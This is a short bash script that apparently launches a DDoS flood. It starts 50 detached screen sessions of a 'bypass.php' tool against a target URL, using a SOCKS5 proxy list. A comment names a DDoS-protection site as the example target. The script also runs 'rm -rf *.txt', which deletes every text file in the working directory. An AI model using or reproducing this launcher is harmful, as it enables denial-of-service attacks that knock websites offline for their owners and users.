#!/bin/bash

# php bypass.php https://ddosguard.botflare.xyz 5 1 2 socks5.txt http

args=("$@")

rm -rf *.txt
for i in {1..50}
do
   screen -dmS BYPASS php bypass.php ${args[0]} ${args[1]} ${args[2]} ${args[3]} ${args[4]} ${args[5]}
   echo sent
done
